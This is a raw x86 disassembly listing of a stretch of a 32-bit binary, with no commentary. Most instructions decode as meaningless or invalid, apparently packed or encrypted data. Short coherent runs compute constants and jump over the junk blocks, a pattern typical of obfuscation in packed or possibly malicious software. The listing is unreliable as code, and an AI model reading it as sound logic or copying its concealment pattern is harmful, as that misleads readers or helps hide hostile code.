  40e088:	leave  
  40e089:	cmp    bl,BYTE PTR [ecx+0x580d6339]
  40e08f:	int    0xac
  40e091:	sub    edi,edi
  40e093:	mov    eax,ds:0x8cf86be0
  40e098:	sbb    DWORD PTR [esi+0x8f74416],esp
  40e09e:	out    dx,al
  40e09f:	jns    0x40e111
  40e0a1:	xchg   BYTE PTR [ecx+0x67],dl
  40e0a4:	mov    WORD PTR [eax],ds
  40e0a6:	into   
  40e0a7:	lahf   
  40e0a8:	lea    ebx,[esi+0x4d]
  40e0ab:	test   BYTE PTR [edx-0x5f8e2dfe],al
  40e0b1:	repz xchg edi,eax
  40e0b3:	shr    DWORD PTR [ebx],0x59
  40e0b6:	push   ebp
  40e0b7:	push   edx
  40e0b8:	xchg   DWORD PTR [edi+0x68],esp
  40e0bb:	cdq    
  40e0bc:	pop    ss
  40e0bd:	pop    edx
  40e0be:	dec    edx
  40e0bf:	xchg   esp,eax
  40e0c0:	push   ds
  40e0c1:	jnp    0x40e06d
  40e0c3:	leavew 
  40e0c5:	loop   0x40e0e1
  40e0c7:	frstor [esp+eax*1]
  40e0ca:	hlt    
  40e0cb:	jae    0x40e115
  40e0cd:	lock pusha 
  40e0cf:	inc    ecx
  40e0d0:	push   ecx
  40e0d1:	xor    eax,0xf2851f6f
  40e0d6:	adc    edi,DWORD PTR [ebx-0x53]
  40e0d9:	dec    esi
  40e0da:	xchg   ecx,eax
  40e0db:	mov    edi,0xa957e349
  40e0e0:	adc    eax,0xeb45da6b
  40e0e5:	lock cli 
  40e0e7:	cmc    
  40e0e8:	inc    ebp
  40e0e9:	mov    bh,0x60
  40e0eb:	lea    esi,[ecx-0x7d]
  40e0ee:	test   al,0x9
  40e0f0:	mov    ecx,0x6c9736f7
  40e0f5:	dec    ch
  40e0f7:	inc    ebx
  40e0f8:	fist   DWORD PTR [ebp-0x2c49abaf]
  40e0fe:	fbstp  TBYTE PTR [esi+ebp*4]
  40e101:	mov    cl,0xeb
  40e103:	(bad)  
  40e104:	mov    al,ds:0x60f7ccce
  40e109:	(bad)  
  40e10a:	xor    BYTE PTR [ebx-0x695b374a],dl
  40e110:	int    0xf2
  40e112:	inc    edi
  40e113:	xor    BYTE PTR [ebx],cl
  40e115:	sahf   
  40e116:	call   0x231e3a3d
  40e11b:	mov    ebp,0x969670eb
  40e120:	pop    ecx
  40e121:	ds pop ebx
  40e123:	mov    ss,WORD PTR [ebx+0x15]
  40e126:	and    dl,BYTE PTR [esi+0x12729568]
  40e12c:	mov    ebp,esi
  40e12e:	dec    esp
  40e12f:	(bad)  
  40e131:	push   edi
  40e132:	ins    BYTE PTR es:[edi],dx
  40e133:	mov    eax,0x35f9247e
  40e138:	jbe    0x40e119
  40e13a:	push   ebp
  40e13b:	jp     0x40e17c
  40e13d:	push   0x1d
  40e13f:	xchg   ecx,eax
  40e140:	xor    dl,BYTE PTR [edx+0x4f4bc7a7]
  40e146:	fadd   st(2),st
  40e148:	push   edi
  40e149:	sub    ch,BYTE PTR [edi-0x7eb7e6e8]
  40e14f:	ins    DWORD PTR es:[edi],dx
  40e150:	mov    dl,BYTE PTR [eax-0x17af6f34]
  40e156:	stos   DWORD PTR es:[edi],eax
  40e157:	outs   dx,DWORD PTR ds:[esi]
  40e158:	scas   al,BYTE PTR es:[edi]
  40e159:	and    DWORD PTR [esi+ebx*4],esp
  40e15c:	cmp    ebx,edx
  40e15e:	js     0x40e121
  40e160:	(bad)
  40e164:	push   ebp
  40e165:	repnz (bad) 
  40e167:	dec    ebx
  40e168:	sahf   
  40e169:	in     eax,0x1
  40e16b:	xor    DWORD PTR [edi-0x2d],0x9
  40e16f:	call   0xdc35:0xf2dd6829
  40e176:	push   ebx
  40e177:	and    BYTE PTR [ecx-0x74989278],0x45
  40e17e:	lock xor eax,0xffffe1ce
  40e184:	add    eax,DWORD PTR [ebp-0xc]
  40e187:	jmp    0x40e44b
  40e18c:	sub    dh,ah
  40e18e:	mov    BYTE PTR [ecx],ah
  40e190:	inc    esi
  40e191:	pop    ds
  40e192:	and    dh,bl
  40e194:	leave  
  40e195:	out    0x4b,eax
  40e197:	jle    0x40e121
  40e199:	xchg   DWORD PTR [ebx-0x50],edi
  40e19c:	into   
  40e19d:	enter  0x1818,0xd2
  40e1a1:	adc    al,0x18
  40e1a3:	sbb    BYTE PTR [ecx],al
  40e1a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1a6:	mov    ds:0x3e48392f,eax
  40e1ab:	(bad)  [ebp+0x11]
  40e1ae:	sub    eax,0x5cc82c96
  40e1b3:	push   esi
  40e1b4:	jnp    0x40e19e
  40e1b6:	pop    ebx
  40e1b7:	ss leave 
  40e1b9:	stc    
  40e1ba:	(bad)  
  40e1bb:	cdq    
  40e1bc:	fldcw  WORD PTR [ebx*8+0x2eb6470d]
  40e1c3:	or     al,0x60
  40e1c5:	rol    esi,1
  40e1c7:	add    al,0x8e
  40e1c9:	push   eax
  40e1ca:	loope  0x40e1b9
  40e1cc:	inc    esp
  40e1cd:	jecxz  0x40e152
  40e1cf:	fs inc eax
  40e1d1:	cmp    al,0x5e
  40e1d3:	push   eax
  40e1d4:	nop
  40e1d5:	adc    DWORD PTR [edi+ebp*2-0x4849140a],esi
  40e1dc:	push   esi
  40e1dd:	jecxz  0x40e1a8
  40e1df:	xlat   BYTE PTR ds:[ebx]
  40e1e0:	data16 add BYTE PTR [esi-0x1733f06c],cl
  40e1e7:	dec    edx
  40e1e8:	dec    edx
  40e1e9:	and    dl,BYTE PTR [edx+0x31]
  40e1ec:	clc    
  40e1ed:	or     esp,ebx
  40e1ef:	push   edi
  40e1f0:	fsubr  st,st(7)
  40e1f2:	stc    
  40e1f3:	mov    dh,0x38
  40e1f5:	imul   eax,DWORD PTR [esi],0xffffff96
  40e1f8:	or     esi,DWORD PTR [ebp+0x5a]
  40e1fb:	shr    eax,cl
  40e1fd:	ret    
  40e1fe:	out    dx,eax
  40e1ff:	sub    DWORD PTR [esi],edi
  40e201:	fs dec esp
  40e203:	push   ebp
  40e204:	scas   eax,DWORD PTR es:[edi]
  40e205:	aam    0x47
  40e207:	add    bl,0xad
  40e20a:	push   es
  40e20b:	adc    BYTE PTR [edx],bl
  40e20d:	cmp    al,0x88
  40e20f:	and    BYTE PTR [ebx-0x4c9c6c0c],0x9c
  40e216:	arpl   WORD PTR [esi-0x3a],bp
  40e219:	in     eax,dx
  40e21a:	fiadd  DWORD PTR [ebp-0x40]
  40e21d:	loopne 0x40e1c8
  40e21f:	shr    DWORD PTR [edx],cl
  40e221:	mov    ebp,0xd274cd3a
  40e226:	jmp    0x5f25c293
  40e22b:	mov    esi,0x67f4f9b
  40e230:	sub    ebp,DWORD PTR ds:0xda07955c
  40e236:	sub    DWORD PTR [ecx-0x45],ebx
  40e239:	lock add bl,al
  40e23c:	push   edi
  40e23d:	loop   0x40e27e
  40e23f:	push   ebp
  40e240:	jp     0x40e1f7
  40e242:	add    eax,0x848c2a3d
  40e247:	mov    dl,0x54
  40e249:	std    
  40e24a:	pop    esi
  40e24b:	add    al,0xda
  40e24d:	fadd   st,st(7)
  40e24f:	jns    0x40e21e
  40e251:	scas   eax,DWORD PTR es:[edi]
  40e252:	mov    dl,0x96
  40e254:	call   0xe3d6:0x34ef57f4
  40e25b:	adc    ah,cl
  40e25d:	retf   0x816b
  40e260:	outs   dx,BYTE PTR ds:[esi]
  40e261:	outs   dx,BYTE PTR ds:[esi]
  40e262:	jle    0x40e25d
  40e264:	sti    
  40e265:	add    eax,0x7dcf6b0b
  40e26a:	jno    0x40e1f9
  40e26c:	mov    ds:0xf2199fc5,eax
  40e271:	test   BYTE PTR cs:[edi],cl
  40e274:	jg     0x40e287
  40e276:	dec    ebp
  40e277:	(bad)  
  40e278:	mov    ch,0x3c
  40e27a:	call   0x2cf5:0xe27a1114
  40e281:	test   esi,esi
  40e283:	or     BYTE PTR ds:0xbc57575,bl
  40e289:	lods   eax,DWORD PTR ds:[esi]
  40e28a:	pop    esp
  40e28b:	fcmovnu st,st(1)
  40e28d:	mov    ebp,0xc323dd56
  40e292:	ss sahf 
  40e294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e295:	fnstenv ds:[ebx]
  40e298:	ret    
  40e299:	scas   al,BYTE PTR es:[edi]
  40e29a:	mov    cl,dh
  40e29c:	or     al,0x90
  40e29e:	mov    BYTE PTR [eax],ah
  40e2a0:	jecxz  0x40e2f5
  40e2a2:	xor    al,BYTE PTR [edi]
  40e2a4:	jecxz  0x40e235
  40e2a6:	inc    ebp
  40e2a7:	fdiv   QWORD PTR [ebp-0xc]
  40e2aa:	ja     0x40e2de
  40e2ac:	(bad)  
  40e2ad:	cmp    al,0xa7
  40e2af:	push   es
  40e2b0:	add    DWORD PTR [esi-0x19b98cb],edi
  40e2b6:	sbb    dh,BYTE PTR [edi-0x7a]
  40e2b9:	test   ah,dh
  40e2bb:	(bad)  
  40e2bc:	jno    0x40e23f
  40e2be:	ins    BYTE PTR es:[edi],dx
  40e2bf:	pop    edi
  40e2c0:	xlat   BYTE PTR ds:[ebx]
  40e2c1:	pushf  
  40e2c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2c3:	mov    ecx,0xae1ee4c6
  40e2c8:	sbb    DWORD PTR [edi-0x47ba506a],ecx
  40e2ce:	(bad)  
  40e2cf:	cmp    eax,0x4927d7d0
  40e2d4:	test   al,0xec
  40e2d6:	sub    BYTE PTR [edi+0x41],ah
  40e2d9:	pusha  
  40e2da:	imul   ecx,ebx,0x2ff6e62e
  40e2e0:	add    al,0xe6
  40e2e2:	xor    BYTE PTR [ebx],0xca
  40e2e5:	rcr    DWORD PTR [esi-0x30b1845],0x75
  40e2ec:	into   
  40e2ed:	fldcw  WORD PTR [eax-0x22d95079]
  40e2f3:	gs cmc 
  40e2f5:	aaa    
  40e2f6:	repnz sub BYTE PTR [ecx+0x2465f8aa],0xde
  40e2fe:	mov    al,ds:0xc80e886e
  40e303:	push   0xef86cf10
  40e308:	and    eax,0xcf582e93
  40e30d:	out    0xb8,eax
  40e30f:	pop    edi
  40e310:	cmp    BYTE PTR [ebx+0x55],ch
  40e313:	mov    ds:0x30b1a85b,eax
  40e318:	mov    ds:0x570abe58,eax
  40e31d:	dec    ebp
  40e31e:	sti    
  40e31f:	cwde   
  40e320:	add    DWORD PTR [eax+0x1554050f],esp
  40e326:	imul   esp,DWORD PTR [eax-0x67],0x196c0672
  40e32d:	pop    ebp
  40e32e:	test   DWORD PTR [ecx],eax
  40e330:	out    0x5e,al
  40e332:	pop    eax
  40e333:	or     BYTE PTR [ecx-0x6447e3fb],bl
  40e339:	inc    esp
  40e33a:	dec    ecx
  40e33b:	cli    
  40e33c:	inc    eax
  40e33d:	pop    ebx
  40e33e:	ins    BYTE PTR es:[edi],dx
  40e33f:	pop    edx
  40e340:	fstp   QWORD PTR [esi-0x73]
  40e343:	cmp    al,0x48
  40e345:	mov    dl,ch
  40e347:	test   eax,0x5a1613f8
  40e34c:	xlat   BYTE PTR ds:[ebx]
  40e34d:	lea    edx,[ecx+0x67]
  40e350:	mov    ds:0xb79222ad,al
  40e355:	sti    
  40e356:	add    ch,BYTE PTR [ecx]
  40e358:	adc    eax,0xf0694e92
  40e35d:	and    BYTE PTR [edx],ah
  40e35f:	fcmovu st,st(1)
  40e361:	mov    DWORD PTR [edi-0x71],eax
  40e364:	and    al,0xb0
  40e366:	in     al,0xd7
  40e368:	push   edi
  40e369:	shl    dh,cl
  40e36b:	adc    DWORD PTR [edx],ebp
  40e36d:	add    DWORD PTR [edi-0x53],0xffffffa0
  40e371:	(bad)  
  40e372:	scas   eax,DWORD PTR es:[edi]
  40e373:	popf   
  40e374:	cmc    
  40e375:	pushf  
  40e376:	ins    DWORD PTR es:[edi],dx
  40e377:	xchg   esi,eax
  40e378:	cmp    ah,BYTE PTR [ebp-0x2d]
  40e37b:	js     0x40e35a
  40e37d:	lods   al,BYTE PTR ds:[esi]
  40e37e:	push   ecx
  40e37f:	into   
  40e380:	mov    bl,dl
  40e382:	lea    edx,[edx]
  40e384:	mov    BYTE PTR [ecx],bl
  40e386:	scas   eax,DWORD PTR es:[edi]
  40e387:	stos   BYTE PTR es:[edi],al
  40e388:	fadd   QWORD PTR [ebx]
  40e38a:	or     BYTE PTR [ebp-0xb440be6],bh
  40e390:	mov    eax,ds:0x48eadc88
  40e395:	inc    ecx
  40e396:	call   0xa113bb1d
  40e39b:	scas   eax,DWORD PTR es:[edi]
  40e39c:	bnd jae 0x40e33b
  40e39f:	imul   edx,DWORD PTR [ebx-0x2b],0xb27507da
  40e3a6:	mov    al,0x88
  40e3a8:	push   ecx
  40e3a9:	shr    ch,1
  40e3ab:	mov    dh,0x0
  40e3ad:	sahf   
  40e3ae:	or     esi,DWORD PTR [ebx+0x19]
  40e3b1:	xchg   ebp,eax
  40e3b2:	hlt    
  40e3b3:	sbb    eax,0xe0651be9
  40e3b8:	fs jecxz 0x40e411
  40e3bb:	aas    
  40e3bc:	mov    esp,0x58c58ae2
  40e3c1:	scas   al,BYTE PTR es:[edi]
  40e3c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c3:	and    ah,BYTE PTR [ebx+0x1c]
  40e3c6:	mov    ds:0x9097ddc6,eax
  40e3cb:	gs cmp eax,0x85072055
  40e3d1:	xor    cl,ah
  40e3d3:	fild   WORD PTR [ecx-0x36797537]
  40e3d9:	lds    edx,FWORD PTR [edi-0x58]
  40e3dc:	dec    esp
  40e3dd:	xor    BYTE PTR [edi-0x5d],cl
  40e3e0:	pop    esi
  40e3e1:	xchg   ebx,eax
  40e3e2:	psubd  mm1,QWORD PTR [eax+0x5fa517e3]
  40e3e9:	in     eax,dx
  40e3ea:	adc    dl,0x4e
  40e3ed:	mov    BYTE PTR [ecx-0x6e],al
  40e3f0:	scas   eax,DWORD PTR es:[edi]
  40e3f1:	cmp    ah,bl
  40e3f3:	cdq    
  40e3f4:	(bad)  
  40e3f5:	addr16 cwde 
  40e3f7:	outs   dx,BYTE PTR ds:[esi]
  40e3f8:	scas   eax,DWORD PTR es:[edi]
  40e3f9:	cwde   
  40e3fa:	cli    
  40e3fb:	mov    BYTE PTR [ebx+0x44],ch
  40e3fe:	loopne 0x40e44b
  40e400:	and    ecx,DWORD PTR [eax+0x79]
  40e403:	(bad)  
  40e404:	jmp    0x40e42f
  40e406:	add    eax,0x285bb306
  40e40b:	push   eax
  40e40c:	popa   
  40e40d:	xchg   esp,eax
  40e40e:	fimul  DWORD PTR [ecx]
  40e410:	enter  0x3096,0xcb
  40e414:	inc    eax
  40e415:	outs   dx,BYTE PTR ds:[esi]
  40e416:	out    dx,eax
  40e417:	sar    BYTE PTR [ebx],1
  40e419:	nop
  40e41a:	mov    eax,0x36340b0f
  40e41f:	jae    0x40e40b
  40e421:	lahf   
  40e422:	idiv   DWORD PTR [ebx]
  40e424:	aaa    
  40e425:	cmp    eax,0x2ecc4959
  40e42a:	jle    0x40e3ce
  40e42c:	out    dx,al
  40e42d:	dec    ecx
  40e42e:	dec    ebx
  40e42f:	cwde   
  40e430:	(bad)  
  40e431:	test   ebx,0x4b5c657e
  40e437:	and    BYTE PTR [esi+ecx*4],dh
  40e43a:	cmp    edx,edx
  40e43c:	xchg   BYTE PTR [eax-0x48],ah
  40e43f:	lahf   
  40e440:	jp     0x40e438
  40e442:	ins    BYTE PTR es:[edi],dx
  40e443:	sbb    al,0x12
  40e445:	pop    ds
  40e446:	add    eax,DWORD PTR [edi+0x3380f149]
  40e44c:	shl    BYTE PTR ds:0x6d33,cl
  40e452:	lea    ecx,[ecx+eax*1-0x6520]
  40e459:	mov    eax,DWORD PTR [ebp+0x8]
  40e45c:	mov    ebx,DWORD PTR [ebp-0x4]
  40e45f:	add    eax,edi
  40e461:	div    ebx
  40e463:	mov    edx,DWORD PTR [ebp-0x8]
  40e466:	mov    ebx,0x940a7
  40e46b:	sub    eax,edx
  40e46d:	xor    edx,edx
  40e46f:	div    ebx
  40e471:	add    eax,esi
  40e473:	cmp    ecx,eax
  40e475:	jb     0x40db77
  40e47b:	xor    ebx,ebx
  40e47d:	inc    ebx
  40e47e:	mov    DWORD PTR [ebp+0xc],0x77bd
  40e485:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40e48c:	mov    DWORD PTR [ebp-0x8],0x4738
  40e493:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40e49a:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40e4a1:	mov    DWORD PTR [ebp-0x14],0x64ec
  40e4a8:	mov    DWORD PTR [ebp-0x18],0x1984
  40e4af:	mov    DWORD PTR [ebp-0x1c],0x293
  40e4b6:	mov    eax,DWORD PTR [ebp+0x8]
  40e4b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4bc:	add    eax,0x1ef2
  40e4c1:	and    eax,ecx
  40e4c3:	xor    eax,0x7240
  40e4c8:	mov    ecx,0x7aaa
  40e4cd:	jmp    0x40e791
  40e4d2:	mov    eax,0x5a62ef3c
  40e4d7:	and    bl,BYTE PTR [edx+edi*1]
  40e4da:	ss dec esi
  40e4dc:	xor    DWORD PTR [eax+0x6a0619af],0x1818c289
  40e4e6:	rcl    BYTE PTR [eax+ebx*1],cl
  40e4e9:	sbb    BYTE PTR [edi],ah
  40e4eb:	(bad)  
  40e4ed:	sub    BYTE PTR [edx+ebx*8+0xaf64f3],bh
  40e4f4:	mov    bl,0x2c
  40e4f6:	cmp    al,0x62
  40e4f8:	cmp    eax,0xd99af3c4
  40e4fd:	in     eax,dx
  40e4fe:	mov    eax,ds:0x6e4ee972
  40e503:	out    0xa4,al
  40e505:	xor    al,0xed
  40e507:	push   ebx
  40e508:	inc    edi
  40e509:	ret    0xc9f2
  40e50c:	retf   0x3672
  40e50f:	adc    BYTE PTR [edi],bl
  40e511:	xor    eax,0x219b8ae8
  40e516:	dec    edx
  40e517:	pushf  
  40e518:	and    eax,0x61e12108
  40e51d:	push   esp
  40e51e:	je     0x40e59b
  40e520:	jg     0x40e4e8
  40e522:	pop    esp
  40e523:	and    bl,BYTE PTR [edx+0xd6c7f46]
  40e529:	sub    edi,edi
  40e52b:	rep outs dx,BYTE PTR ds:[esi]
  40e52d:	imul   ebp,DWORD PTR [esi-0x46],0x31e8ad66
  40e534:	mov    dl,0x7f
  40e536:	imul   ebx,ebx,0x74
  40e539:	pop    ss
  40e53a:	test   al,0x84
  40e53c:	mov    cs:0x7514918c,al
  40e542:	in     eax,dx
  40e543:	pop    edx
  40e544:	pop    edx
  40e545:	pushf  
  40e546:	xchg   DWORD PTR [edx+0x62],ebx
  40e549:	pop    ss
  40e54a:	xchg   esp,eax
  40e54b:	and    BYTE PTR [edi+0x751806b4],bl
  40e551:	shl    BYTE PTR [edx+esi*4],0x28
  40e555:	xchg   edx,eax
  40e556:	mov    ch,0x58
  40e558:	sbb    BYTE PTR [edi],0xa4
  40e55b:	ja     0x40e5a2
  40e55d:	cli    
  40e55e:	mov    ecx,DWORD PTR [esi+0x4eb6a4b9]
  40e564:	push   ebp
  40e565:	ret    
  40e566:	pop    ds
  40e567:	in     al,0x64
  40e569:	aad    0x90
  40e56b:	xlat   BYTE PTR ds:[ebx]
  40e56c:	cmp    DWORD PTR [ebp-0x4a5ac092],ebx
  40e572:	and    eax,edi
  40e574:	fst    DWORD PTR es:[ebp+ebp*8-0x24]
  40e579:	sub    DWORD PTR [eax],eax
  40e57b:	mov    bl,0x84
  40e57d:	add    ah,ah
  40e57f:	fstp   TBYTE PTR [ecx]
  40e581:	mov    edi,0x815b8aa2
  40e586:	int3   
  40e587:	in     eax,dx
  40e588:	adc    edi,DWORD PTR [ebp+ebp*4+0x0]
  40e58c:	push   ds
  40e58d:	imul   esp,ebx,0x5742d01d
  40e593:	aam    0x84
  40e595:	dec    eax
  40e596:	xor    DWORD PTR [ebp+0x3c3d70c8],0xffffff91
  40e59d:	sbb    bl,0xb3
  40e5a0:	in     eax,0x58
  40e5a2:	push   ebx
  40e5a3:	pop    esp
  40e5a4:	xor    cl,BYTE PTR [esi+0xa]
  40e5a7:	mul    DWORD PTR [eax+0x3b3f7de2]
  40e5ad:	mov    ds:0x73048faa,eax
  40e5b2:	pop    ds
  40e5b3:	in     al,0x77
  40e5b5:	adc    al,BYTE PTR [esi]
  40e5b7:	mov    bh,0x0
  40e5b9:	jbe    0x40e548
  40e5bb:	lds    edx,FWORD PTR [ecx+0x4e]
  40e5be:	adc    BYTE PTR [ecx+0x68],cl
  40e5c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5c2:	mov    ch,0x82
  40e5c4:	xchg   esp,eax
  40e5c5:	pop    ebp
  40e5c6:	pop    eax
  40e5c7:	mov    WORD PTR [esp+ebp*2-0x73],gs
  40e5cb:	xchg   ebx,eax
  40e5cc:	mov    ebp,0x486869fa
  40e5d1:	mov    dh,0x94
  40e5d3:	fs inc edx
  40e5d5:	(bad)  
  40e5d6:	mov    bl,0xb3
  40e5d8:	cwde   
  40e5d9:	push   cs
  40e5da:	je     0x40e5c2
  40e5dc:	sub    al,0xc5
  40e5de:	mov    ebx,0xae9a6be2
  40e5e3:	push   ds
  40e5e4:	out    dx,eax
  40e5e5:	push   0xffffffda
  40e5e7:	jmp    0x40e606
  40e5e9:	xor    eax,DWORD PTR es:[edx]
  40e5ec:	popa   
  40e5ed:	pop    ebx
  40e5ee:	cdq    
  40e5ef:	(bad)  
  40e5f0:	rcr    BYTE PTR [edx+0x57207b55],0x12
  40e5f7:	in     eax,dx
  40e5f8:	mov    esp,DWORD PTR ds:0xf5c5651c
  40e5fe:	sahf   
  40e5ff:	jl     0x40e5c4
  40e601:	popf   
  40e602:	xchg   ebx,eax
  40e603:	lds    esi,FWORD PTR [edx]
  40e605:	stos   BYTE PTR es:[edi],al
  40e606:	aas    
  40e607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e608:	loop   0x40e671
  40e60a:	iret   
  40e60b:	sbb    ah,bh
  40e60d:	ror    BYTE PTR [esi+esi*1+0x3062a5d1],0x47
  40e615:	ins    DWORD PTR es:[edi],dx
  40e616:	repz cmp ch,dl
  40e619:	outs   dx,BYTE PTR ds:[esi]
  40e61a:	adc    eax,ecx
  40e61c:	icebp  
  40e61d:	and    edx,DWORD PTR [ebp-0x73]
  40e620:	fnstenv [ebx+0x529a5749]
  40e626:	sub    DWORD PTR [eax-0x73ee6de3],edi
  40e62c:	fcmovb st,st(3)
  40e62e:	int3   
  40e62f:	mov    ebx,0x931d0c05
  40e634:	dec    esp
  40e635:	xor    DWORD PTR [eax],ecx
  40e637:	retf   0x108a
  40e63a:	in     al,0x11
  40e63c:	xchg   ecx,eax
  40e63d:	sub    bh,BYTE PTR [edi]
  40e63f:	outs   dx,BYTE PTR ds:[esi]
  40e640:	xchg   edi,eax
  40e641:	jge    0x40e6b1
  40e643:	cmp    DWORD PTR [edi-0x56a24a85],0x51c25f9e
  40e64d:	push   0xffffff9a
  40e64f:	add    ecx,DWORD PTR ds:0x1ff1eac3
  40e655:	scas   al,BYTE PTR es:[edi]
  40e656:	mov    bl,0xb3
  40e658:	outs   dx,DWORD PTR ds:[esi]
  40e659:	jecxz  0x40e65c
  40e65b:	test   eax,0xbad0dc7a
  40e660:	into   
  40e661:	mov    ecx,0x84348265
  40e666:	fimul  WORD PTR [ecx+0x6f4640bf]
  40e66c:	ins    DWORD PTR es:[edi],dx
  40e66d:	adc    ch,BYTE PTR [ebp+0x24]
  40e670:	mov    eax,0x89c46ae
  40e675:	mov    ebp,0xa73a7378
  40e67a:	push   ds
  40e67b:	gs add BYTE PTR ds:[ebx+0x6e],cl
  40e680:	xor    ebx,ebx
  40e682:	setno  BYTE PTR [ebx]
  40e685:	lds    ecx,FWORD PTR [ebx]
  40e687:	push   0xb75ddbc
  40e68c:	ror    BYTE PTR ds:0x1175d804,0x49
  40e693:	push   ebp
  40e694:	clc    
  40e695:	lea    esp,[ecx]
  40e697:	out    0xd4,al
  40e699:	lock mov edi,0xc64a6f48
  40e69f:	xchg   ebx,eax
  40e6a0:	loop   0x40e6f5
  40e6a2:	stc    
  40e6a3:	mov    al,ds:0xe4558607
  40e6a8:	pop    edx
  40e6a9:	mov    ecx,0x8a8544d2
  40e6ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6af:	mov    ch,0x98
  40e6b1:	inc    edx
  40e6b2:	add    al,0x77
  40e6b4:	jge    0x40e66b
  40e6b6:	rcl    DWORD PTR [ebx-0x7e597593],0x16
  40e6bd:	and    eax,0x619622b2
  40e6c2:	pop    esp
  40e6c3:	pop    eax
  40e6c4:	and    BYTE PTR [esi-0x33],ch
  40e6c7:	mov    edi,0xd914251d
  40e6cc:	ja     0x40e74a
  40e6ce:	xchg   edi,eax
  40e6cf:	jg     0x40e72e
  40e6d1:	stos   DWORD PTR es:[edi],eax
  40e6d2:	inc    esi
  40e6d3:	adc    eax,DWORD PTR [ebx]
  40e6d5:	dec    eax
  40e6d6:	out    0xd4,al
  40e6d8:	add    DWORD PTR [ecx-0x48db26c0],esi
  40e6de:	mov    dh,0xb4
  40e6e0:	ins    DWORD PTR es:[edi],dx
  40e6e1:	jb     0x40e697
  40e6e3:	je     0x40e6d5
  40e6e5:	mov    bl,0xf1
  40e6e7:	in     eax,dx
  40e6e8:	out    0xf2,al
  40e6ea:	adc    bh,BYTE PTR [ecx+0x74]
  40e6ed:	mov    al,0xed
  40e6ef:	(bad)  
  40e6f0:	int    0x23
  40e6f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6f3:	add    BYTE PTR [edx],0xb0
  40e6f6:	in     eax,0x2d
  40e6f8:	sahf   
  40e6f9:	imul   ebx,DWORD PTR [edi],0xffffffc4
  40e6fc:	aas    
  40e6fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6fe:	psrlq  mm1,mm6
  40e701:	icebp  
  40e702:	daa    
  40e703:	mov    es,WORD PTR [edx+0x5]
  40e706:	sti    
  40e707:	(bad)  
  40e708:	pop    edi
  40e709:	cs (bad) 
  40e70b:	test   DWORD PTR [esi+0x7c],0x341ed7fe
  40e712:	sub    DWORD PTR [ebx],edi
  40e714:	mov    esi,0x7c6f65bb
  40e719:	inc    eax
  40e71a:	lea    ebp,[eax+0x4629b81f]
  40e720:	shr    DWORD PTR [edi],0xc9
  40e723:	dec    ebx
  40e724:	jle    0x40e71a
  40e726:	aaa    
  40e727:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e728:	sub    eax,0x77475786
  40e72d:	jle    0x40e6be
  40e72f:	sbb    eax,0xa1ff1c9d
  40e734:	stos   BYTE PTR es:[edi],al
  40e735:	mov    edx,0x7f3393a5
  40e73a:	adc    ecx,DWORD PTR [ecx-0x164c695e]
  40e740:	dec    eax
  40e741:	push   esi
  40e742:	test   BYTE PTR [ebp-0x6dc49466],ah
  40e748:	hlt    
  40e749:	repz mov dh,BYTE PTR [ebx]
  40e74c:	out    0xc,eax
  40e74e:	out    dx,al
  40e74f:	or     eax,0x26b7a1fb
  40e754:	aad    0x2e
  40e756:	pop    eax
  40e757:	fdivr  st(5),st
  40e759:	or     al,0x82
  40e75b:	ins    BYTE PTR es:[edi],dx
  40e75c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e75d:	sar    BYTE PTR [ecx],cl
  40e75f:	push   esp
  40e760:	popa   
  40e761:	push   ss
  40e762:	(bad)  
  40e763:	(bad)  
  40e764:	fistp  WORD PTR [esi-0x4370682f]
  40e76a:	(bad)  
  40e76b:	retf   
  40e76c:	dec    edx
  40e76d:	ss or  eax,0xbdace3e0
  40e773:	sub    al,0x5e
  40e775:	ficom  WORD PTR [ebp-0x43c9b444]
  40e77b:	or     eax,0x82b24569
  40e780:	xor    DWORD PTR [esi],esp
  40e782:	dec    esp
  40e783:	sub    edx,esi
  40e785:	fdivp  st(4),st
  40e787:	lahf   
  40e788:	mov    bh,0xa
  40e78a:	ss mov esi,0x20210c84
  40e790:	lahf   
  40e791:	sub    ecx,eax
  40e793:	mov    DWORD PTR [ebp+0xc],0x8d3
  40e79a:	mov    DWORD PTR [ebp+0x8],0x2392
  40e7a1:	mov    DWORD PTR [ebp-0x20],ebx
  40e7a4:	mov    DWORD PTR [ebp-0x24],0x338f
  40e7ab:	mov    DWORD PTR [ebp-0x28],0x61c9
  40e7b2:	mov    eax,DWORD PTR [ebp+0x8]
  40e7b5:	mov    edx,DWORD PTR [ebp+0xc]
  40e7b8:	imul   eax,edx
  40e7bb:	xor    eax,0x40a0
  40e7c0:	or     eax,0x1a48
  40e7c5:	xor    eax,0x139ddb0
  40e7ca:	mov    esi,ecx
  40e7cc:	sub    esi,eax
  40e7ce:	mov    eax,DWORD PTR [ebp-0x28]
  40e7d1:	mov    edx,DWORD PTR [ebp-0x24]
  40e7d4:	mov    edi,DWORD PTR [ebp-0x20]
  40e7d7:	or     eax,0x1cc2
  40e7dc:	sub    eax,edx
  40e7de:	jmp    0x40eaa2
  40e7e3:	or     BYTE PTR [esp+ebx*1-0xd],0x1c
  40e7e8:	loop   0x40e828
  40e7ea:	sbb    bh,BYTE PTR [esi]
  40e7ec:	call   DWORD PTR [ebx-0x56]
  40e7ef:	stos   BYTE PTR es:[edi],al
  40e7f0:	or     bl,dl
  40e7f2:	mov    esp,0x1818be42
  40e7f7:	rcl    BYTE PTR [eax+ebx*1],cl
  40e7fa:	sbb    BYTE PTR [ecx],bh
  40e7fc:	mov    al,ds:0x893e105
  40e801:	lock ss dec edi
  40e804:	or     eax,0xc46af346
  40e809:	sbb    bh,BYTE PTR [eax+0x21]
  40e80c:	les    ebp,FWORD PTR [eax+0x5e495557]
